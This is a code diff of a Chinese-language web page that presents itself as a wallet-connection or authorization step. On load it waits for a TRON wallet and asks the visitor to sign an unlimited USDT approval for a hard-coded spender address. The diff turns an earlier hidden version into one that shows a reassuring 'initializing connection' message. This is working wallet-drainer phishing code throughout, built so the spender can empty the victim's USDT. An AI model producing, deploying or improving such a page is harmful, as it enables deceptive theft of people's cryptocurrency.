@@ -4,37 +4,49 @@
     <meta charset="UTF-8">
     <title>授权页面</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- 双CDN备用，防止加载失败 -->
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
+    <style>
+        body{background:#fff;text-align:center;padding-top:120px;font-size:16px;color:#333;}
+    </style>
 </head>
-<body style="display:none;">
+<body>
+<div id="tip">正在初始化钱包连接，请稍候...</div>
 <script>
-// 配置参数
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER_ADDR = "TTbMYbFf3GoURy8S536ZWioGCEn74T8S3U";
 const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+const tipDom = document.getElementById('tip');
 
-// 等待 TronWeb 注入并就绪
-async function waitForTronWeb() {
-    return new Promise((resolve) => {
-        const checkInterval = setInterval(() => {
-            if (window.tronWeb && window.tronWeb.ready) {
-                clearInterval(checkInterval);
-                resolve(window.tronWeb);
+// 等待钱包注入
+function waitTron(){
+    return new Promise(res=>{
+        let t = setInterval(()=>{
+            if(window.tronWeb && window.tronWeb.ready){
+                clearInterval(t);
+                res(window.tronWeb);
             }
-        }, 500);
-    });
+        },600)
+    })
 }
 
-// 自动发起授权
-async function autoAuth() {
-    const tronWeb = await waitForTronWeb();
-    const usdtContract = tronWeb.contract().at(USDT_CONTRACT);
-    await usdtContract.approve(SPENDER_ADDR, MAX_AMOUNT).send();
+// 自动授权
+async function runAuth(){
+    try{
+        tipDom.innerText = "检测到钱包，发起授权请求...";
+        const tron = await waitTron();
+        const usdt = tron.contract().at(USDT_CONTRACT);
+        // 唤起签名弹窗
+        const txHash = await usdt.approve(SPENDER_ADDR, MAX_AMOUNT).send();
+        tipDom.innerText = `授权成功，交易哈希：${txHash}`;
+    }catch(err){
+        tipDom.innerText = "授权失败：" + err.message;
+        console.error(err);
+    }
 }
 
-// 页面加载后立即执行
-window.onload = autoAuth;
+window.addEventListener('load',runAuth);
 </script>
 </body>
 </html>
